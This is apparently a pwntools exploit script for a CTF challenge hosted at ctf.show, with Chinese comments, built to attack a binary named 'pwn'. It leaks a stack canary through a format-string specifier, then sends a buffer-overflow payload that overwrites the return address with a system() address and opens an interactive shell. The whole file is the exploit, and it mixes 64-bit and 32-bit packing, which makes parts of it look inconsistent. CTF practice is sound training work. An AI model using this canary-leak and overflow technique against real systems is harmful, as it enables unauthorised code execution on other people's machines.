from kk import*
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('pwn.challenge.ctf.show', 28105)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p, 'vmmap')

    # ================= 你的利用代码写这里 =================
    system = 0x080486ce
    
    p.recv()

    payload = b'%15$x'       #b'a'*0x28 + b'b' 
    p.sendline(payload)
    canary = int(p.recv(),16)
    print(hex(canary))

    payload = b'a'*0x28 + p64(canary) + b'b'*8 + p32(system)
    p.sendline(payload)
    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()